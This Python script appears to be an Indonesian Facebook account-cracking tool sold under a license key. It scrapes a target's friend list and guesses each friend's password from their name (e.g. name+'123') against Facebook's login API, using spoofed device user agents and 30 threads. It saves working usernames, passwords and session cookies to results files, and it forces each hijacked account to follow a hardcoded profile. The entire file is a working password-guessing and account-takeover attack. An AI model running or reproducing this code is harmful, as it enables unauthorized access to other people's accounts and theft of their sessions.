import requests, os, sys, time, re, random,rich,datetime,platform,json
from datetime import datetime
from rich import print as prints
from rich.console import Console
from rich.console import Console as tol
from rich.panel import Panel
from rich.panel import Panel as nel
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from time import time as mek
from rich.columns import Columns

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
P = '\x1b[1;97m'
B = '\x1b[1;94m' # BIRU
ct = datetime.now().month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if ct < 0 or ct > 12:
        exit()
    nTemp = ct - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
bc = '[bold cyan]'
hapus = '[/]'
Ubah=[]
ugen=[]
lisensikuni=[]
lisensiku=['sukses']
import random,re,os
android_version=str(random.randrange(6,13))
application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
application_version_code=str(random.randint(000000000,999999999))
fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
gtt=gttt=random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"])
for x in range(1000):
	ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ugen.append(ua_string)
clear=os.system('clear')
class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.kontol = {}
        self.tol = Console()
        self.menu()

    def headd(self):
        head = {
            "Host": "mbasic.facebook.com", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="106", "Google Chrome";v="106"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-model": "", "ch-ua-platform": '"Android"', "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.4.3767.69265"
        }
        return head
    def ingfo(self):
        urut=[]
        prints(Panel(f"\t[{bc}!{hapus}] Hasil crack akan di simpan di dalam folder results", padding=(0,4),style=""))
        urut.append(Panel(f"result/OK/[bold green]OK-{ha}-{op}-{ta}.txt[/]",padding=(0,2),style=""))
        urut.append(Panel(f"result/CP/[bold yellow]CP-{ha}-{op}-{ta}.txt[/]",padding=(0,2),style=""))
        self.tol.print(Columns(urut))
        prints(Panel(f"\t[{bc}!{hapus}] Mainkan mode pesawat setiap 200 ID", padding=(0,4),style=""))
        print('')
    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
          ⠀⠀{B}⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣄⡀⠀⠀⠀
    ⠀ ⠀{P}𝚌𝚛𝚊𝚌𝚔{B}⠀ ⠀⠀⠀⠀⠐⠀⣰⣿⣿⣿⣿⣿⡇⠀⠀⠀
        ⠀⠀ ⠀⠀{B}⠀⠀⠀⠀⠀⢠⣿⣿⣿⠏⠉⠉⠁⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⠀ ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
         ⠀⠀⠀{B}⠀⠀⠀⠿⠿⢿⣿⣿⣿⠿⠿⠿⠇⠀⠀⠀
          ⠀⠀⠀{B}⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀ ⠀{B}⠀ ⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀  {B}⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀ ⠀ {B}  ⠀⠀   ⠀⠀⢸⣿⣿⣿   {P}acebook Tools {M}[ NCEK - XD ]{P}\n   				Version 0.1⠀⠀⠀⠀⠀⠀⠀
 """)

    def login_cokie(self):
        self.logoo()
        cok = input("[?] cookie : ");self.bahasa(cok)
        link = self.ses.get("https://mbasic.facebook.com/profile.php?v=info", cookies={"cookie": cok}, headers=self.headd()).text
        print()
        try:
            nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
            if "Konten Tidak Ditemukan" in nama:
                print("[!] the cookie you entered is invalid");time.sleep(2);self.login_cokie()
            elif "Perlu persetujuan login" in nama:
                print("\n[!] Opshh your cookies checkpoint:(");time.sleep(2);self.login_cokie()
            elif "Gunakan mode dasar" in nama:
                self.ubah_data({"cookie":cok})
            elif "anda sedang menggunakan mode free facebook" in nama:
                self.ubah_data({"cookie":cok})
            elif "Gunakan Facebook dalam mode dasar dengan IM3" in nama:
                self.ubah_data({"cookie":cok})
            else:
                print("[-] Please wait a moment...")
                print(f"[✓] Welcome {H}{nama}{N}");self.akses({"cookie":cok})
                open(".cokie.txt", "a").write(cok)
                open(".namaa.txt","a").write(nama)
                exit("\n[!] run the command again by typing python run.py")
        except requests.exceptions.TooManyRedirects:
            print("[!] the cookie you entered is invalid");time.sleep(2);self.login_cokie()
    def akses(self, cok):
        try:
            link = par(self.ses.get("https://mbasic.facebook.com/profile.php?id=100005395413800", headers=self.headd(), cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"https://mbasic.facebook.com{str(xnxx)}", cookies=cok, headers=self.headd()).text
            link1 = par(self.ses.get("https://mbasic.facebook.com/profile.php?id=100005395413800", headers=self.headd(), cookies=cok).text, "html.parser")
            xnxx1 = link1.find("a", string="Ikuti").get("href")
            self.ses.get(f"https://mbasic.facebook.com{str(xnxx1)}", cookies=cok, headers=self.headd()).text
        except:pass
    def ubah_data(self, cok):
        print("[+] note: you are using facebook free mode")
        print("[-] Please wait a moment, the system is changing cookies to data mode.")
        ses=requests.Session()
        try:
            link = par(ses.get("https://mbasic.facebook.com/profile.php?v=info", cookies=cok, headers=self.headd()).text, "html.parser")
            for x in link.find_all("a", href=True):
                if "Tidak, Terima Kasih" in x.text:
                    gett = ses.get(f"https://mbasic.facebook.com{x['href']}", cookies=cok, headers=self.headd()).text
                    data = par(gett, "html.parser")
                    poss = data.find("form",{"method":"post"})["action"]
                    date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1), "submit"  : "OK, Gunakan Data"}
                    ses.post(f"https://mbasic.facebook.com{poss}", data=date, cookies=cok, headers=self.headd());self.akses(cok)
                    exit("\n[✓] the process of changing to data mode has been completed.\n[-] please re-enter the cookie by typing python run.py")
        except Exception as e:
            exit(e)

    def bahasa(self, cok):
        try:
            link = self.ses.get("https://mbasic.facebook.com/language/", cookies={"cookie": cok}, headers=self.headd()).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"https://mbasic.facebook.com{x['action']}", data=bahasa, cookies={"cookie": cok}, headers=self.headd())
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get("https://mbasic.facebook.com/profile.php?id=100030072332427", headers=self.headd(), cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"https://mbasic.facebook.com{str(xnxx)}", cookies=cok, headers=self.headd()).text
        except:pass
        
    def convert(self, url):
        if "https" in url or "facebook" in url or "me" in url:user = url.split("/")[3]
        else:user=url
        try:uid = re.findall(";rid=(\d+)&amp;",str(self.ses.get("https://m.facebook.com/"+user).text))[0]
        except:uid = url
        return uid
        
    def menu(self):
        if 'sukses' in lisensiku:
        	pass
        else:lisensi()
        try:
            cook = {"cookie": open(".cokie.txt", "r").read()}
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get("https://mbasic.facebook.com/profile.php?v=info", cookies=cook, headers=self.headd()).text
            jnck = re.findall("\<title\>(.*?)<\/title\>", link)[0]
            if "Perlu persetujuan login" in jnck:
                try:os.remove(".cokie.txt");os.remove(".namaa.txt")
                except:pass
                print("[!] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        print(f'\tKetik {H}"cek"{P} untuk melihat hasil crack')
        print(f'\tKetik {H}"hapus"{P} untuk melihat hasil crack')
        print('-'*68)
        user = input(f"[{O}*{N}] masukan id atau username target : ")
        if "cek" in user:
        	self.cek_hasil()
        elif "Cek" in user:
        	self.cek_hasil()
        elif "hapus" in user:
        	time.sleep(3)
        	os.remove('.cokie.txt')
        	os.remove('.namaa.txt')
        	exit('Berhasil menghapus cookie')
        elif "Hapus" in user:
        	time.sleep(3)
        	os.remove('.cokie.txt')
        	os.remove('.namaa.txt')
        	exit('Berhasil menghapus cookie')
        elif "me" in user:
                print("[!] tekan CTRL + C untuk berhenti dump id.")
                self.aing("https://mbasic.facebook.com/friends/center/friends/", cook)
        else:
                    try:
                        link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=cook, headers=self.headd()).text
                        if "Tidak Ada Teman Untuk Ditampilkan" in link:
                            print("[!] daftar teman tidak di publikasikan");time.sleep(2);self.menu()
                        elif "Halaman yang Anda minta tidak ditemukan." in link:
                            print(f"[!] pengguna dengan id {user} tidak ditemukan");time.sleep(2);self.menu()
                        elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in link:
                            print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                        elif "Konten Tidak Ditemukan" in link:
                            print(f"[!] Pengguna Dengan Id {user} tidak ditemukan");time.sleep(2);self.menu()
                        else:
                            print("[!] tekan CTRL + C untuk berhenti dump id.")
                            self.batur(f"https://mbasic.facebook.com/{user}/friends", cook)
                    except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                        exit(" [!] kesalahan pada koneksi")
                    if " " in str(len(self.id)):
                        self.ubah_data(cook)
                    else:
                        print()
                        self.paswww()
    def cek_hasil(self):
        self.logoo()
        hsl_ok, hsl_cp = [], []
        print('-'*68)
        print("""
    [01] check result ok
    [02] check result cp
    [03] remove result
        """)
        pil =  input("Choise: ")
        if pil in [" ", ""]:
            print(f"\n{M}Don't be empty{N}");time.sleep(2);self.cek_hasil()
        elif pil in ["01", "1"]:
            try:
                dirs = os.listdir("results/OK")
                for i in dirs:
                    hsl_ok.append(i)
            except:pass
            if len(hsl_ok)==0:
                exit(f"\n[{M}!{N}] no ok result to display")
            else:
                xa = {}
                xi = 0
                print("  +------------------------------------------------------+")
                for ok in hsl_ok:
                    try:okk = open(f"results/OK/{ok}").readlines()
                    except:continue
                    xi +=1
                    if xi<100:
                        nom =""+str(xi)
                        xa.update({str(xi):str(ok)})
                        xa.update({nom+"0":str(xi)})
                        print(f"    [{nom}] {ok}  {H}{str(len(okk))}{N} account")
                    else:
                        xa.update({nom+"0":str(xi)})
                        print(f"    [{nom}] {ok}  {H}{str(len(okk))}{N} account")
                print("  +------------------------------------------------------+")
                file = input("\nChoise: ")
                try:ajg = xa[file]
                except KeyError:print(f"\n{M}choose the right one{N}");time.sleep(2);self.cek_hasil()
                total = open(f"results/OK/{ajg}", "r").readlines()
                print("  +------------------------------------------------------+")
                for ha in total:
                    kontol = ha.replace("\n","")
                    titid  = kontol.replace("[✓] ", f"[{H}✓{N}] ")
                    print(f"    {titid}{N}");time.sleep(0.03)
                print("  +------------------------------------------------------+")
                exit(f"    ({H}✓{N}) Check result ok has finished")
        elif pil in ["02", "2"]:
            try:
                dirs = os.listdir("results/CP")
                for i in dirs:
                    hsl_cp.append(i)
            except:pass
            if len(hsl_cp)==0:
                exit(f"\n[{M}!{N}] no cp result to display")
            else:
                xa = {}
                xi = 0
                print("  +------------------------------------------------------+")
                for cp in hsl_cp:
                    try:cpp = open(f"results/CP/{cp}").readlines()
                    except:continue
                    xi +=1
                    if xi<100:
                        nom =""+str(xi)
                        xa.update({str(xi):str(cp)})
                        xa.update({nom+"0":str(xi)})
                        print(f"    [{nom}] {cp}  {H}{str(len(cpp))}{N} account")
                    else:
                        xa.update({nom+"0":str(xi)})
                        print(f"    [{nom}] {cp}  {H}{str(len(cpp))}{N} account")
                print("  +------------------------------------------------------+")
                file = input("\nChoise: ")
                try:ajg = xa[file]
                except KeyError:print(f"\n{M}choose the right one{N}");time.sleep(2);self.cek_hasil()
                total = open(f"results/CP/{ajg}", "r").readlines()
                print("  +------------------------------------------------------+")
                for ha in total:
                    kontol = ha.replace("\n","")
                    titid  = kontol.replace("[×] ", f"[{M}×{N}] ")
                    print(f"    {titid}{N}");time.sleep(0.03)
                print("  +------------------------------------------------------+")
                exit(f"    ({H}✓{N}) Check result cp has finished")
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki, headers=self.headd()).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur("https://mbasic.facebook.com"+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def aing(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki, headers=self.headd()).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "?uid" in softek[0]:
                    self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat selengkapnya" in kontol:
                self.batur("https://mbasic.facebook.com"+par(kontol, "html.parser").find("a", string="Lihat selengkapnya").get("href"), coki)
        except:pass

    def like(self, url, coki):
        try:
            gett = self.ses.get(url, cookies=coki, headers=self.headd()).text
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>', gett)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id=(.*)&amp;eav",softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in gett:
                self.like("https://mbasic.facebook.com"+par(gett, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except Exception as e:
            print(e)

    def paswww(self):
        os.system('clear')
        self.logoo()
        self.ingfo()
        with Modol(max_workers=30) as bool:
            for user in self.id:
                uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                depan = nama.split(" ")[0]
                if len(nama) <=5:
                    if len(depan) <=1 or len(depan) <=2:pass
                    else:
                        pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321"]
                else:
                    pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321"]
                    bool.submit(self.Ngocok, uid, pwx)
        exit(f'\r [ • ] crack telah selesai jumlah OK:{len(self.ok)} jumlah CP:{len(self.cp)} ')
    def ua_ap(self):
        rr = random.randint
        rc = random.choice
        HP1 = 'HM 1S Build/KTU84P'
        HP2 = 'HM 1S'
        HP3 = 'HM'
        card = 'XL'
        return (f'Dalvik/2.1.0 (Linux; U; Android {str(rr(10,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1412};]')

    def Ngocok(self, username, pasw):
        sys.stdout.write(f"\r[ {H}crack{P} ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_ap()
                head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': uas,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'ja_JP', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r[ID] : {H}{username}{P}                   \n[PW] : {H}{password}{P}\n[Cookie] : {H}{coki}{P}\n")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ikuti(coki)
                    self.ok.append(kntl)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r[ID] : {M}{username}{P}                   \n[PW] : {M}{password}{P}\n")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:sys.stdout.write(f"\r[ {M}spam{N} ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}   ");sys.stdout.flush();time.sleep(5)
        self.lo+=1
        
def tlisensi():
    prints(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');time.sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    open('.lisen.txt','w').write(lisen)
    lisensi()   
    
def lisensi():
	try:
	 cek=open('.lisen.txt').read()
	 lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMzU4MjU2MiIsInZBRzNxYXY4SXljcllZMi93eUdRWHB4b0tQOTZYaktPalUwSDlrWWQiXQ==&ProductId=18090&Key='+lisensikuni[0]).json()
	status=res['licenseKey']['key']
	if status ==cek:
	 prints(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
	 time.sleep(2)
	 lisensiku.append("sukses")
	 Login()
	elif status == KeyError:
		os.system('rm .lisen.txt')
	else:
		tlisensi()
Login()